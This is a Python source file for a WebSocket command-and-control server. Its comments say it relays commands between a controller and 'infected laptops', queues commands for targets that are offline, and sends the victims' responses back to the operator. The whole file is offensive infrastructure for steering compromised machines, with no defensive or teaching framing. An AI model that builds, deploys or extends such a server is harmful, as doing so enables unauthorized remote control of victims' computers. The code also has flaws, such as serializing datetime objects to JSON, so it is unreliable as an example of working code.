import asyncio
import websockets
import json
import uuid
from datetime import datetime, timedelta

# Store connected computers and messages
clients = {}
messages = []

# Message retention time (1 day)
MESSAGE_RETENTION_PERIOD = timedelta(days=1)

# Utility function to clean up old messages
def cleanup_old_messages():
    global messages
    cutoff = datetime.now() - MESSAGE_RETENTION_PERIOD
    messages[:] = [msg for msg in messages if msg['command_time'] > cutoff]

# Assign a unique ID to each new connection
async def register_client(websocket):
    client_id = str(uuid.uuid4())
    clients[client_id] = {
        'websocket': websocket,
        'last_seen': datetime.now(),
        'messages': []  # For storing unsent messages
    }
    return client_id

# Relay messages between control and infected laptops
async def relay_messages(websocket, client_id):
    while True:
        try:
            # Receive message from the client
            message = await websocket.recv()
            data = json.loads(message)
            cleanup_old_messages()  # Clean up old messages before processing new ones
            
            if data.get("type") == "command":
                # Controller sends a command to an infected laptop
                target_id = data['target']
                command = data['command']
                command_type = data['command_type']

                if target_id in clients:
                    target_ws = clients[target_id]['websocket']
                    command_id = str(uuid.uuid4())
                    command_time = datetime.now()

                    new_message = {
                        'id': command_id,
                        'origin': client_id,
                        'target': target_id,
                        'command_time': command_time,
                        'response_time': None,
                        'type': command_type,
                        'command': command,
                        'response': None
                    }

                    # Send the command to the target
                    await target_ws.send(json.dumps(new_message))
                    messages.append(new_message)  # Log the message
                    
                else:
                    # If the target is not available, queue the message
                    clients[client_id]['messages'].append(data)
                    print(f"Client {target_id} is not connected. Command queued.")
                    
            elif data.get("type") == "response":
                # Infected laptop sends a response back to the controller
                command_id = data['command_id']
                response = data['response']

                # Find the original command and update it with the response
                for msg in messages:
                    if msg['id'] == command_id:
                        msg['response'] = response
                        msg['response_time'] = datetime.now()
                        break

                # Relay the response back to the originating client (controller)
                origin_id = msg['origin']
                if origin_id in clients:
                    origin_ws = clients[origin_id]['websocket']
                    await origin_ws.send(json.dumps(msg))

        except websockets.ConnectionClosed:
            # Client disconnected, remove it from the list
            print(f"Client {client_id} disconnected.")
            del clients[client_id]
            break

# Handle new connections
async def connection_handler(websocket, path):
    client_id = await register_client(websocket)
    print(f"New client connected: {client_id}")

    try:
        await relay_messages(websocket, client_id)
    except websockets.ConnectionClosed:
        print(f"Connection closed for client: {client_id}")
        del clients[client_id]

# Start the WebSocket server
async def main():
    async with websockets.serve(connection_handler, "0.0.0.0", 5000):
        print("C2 WebSocket server is running...")
        await asyncio.Future()  # Run forever

if __name__ == "__main__":
    asyncio.run(main())
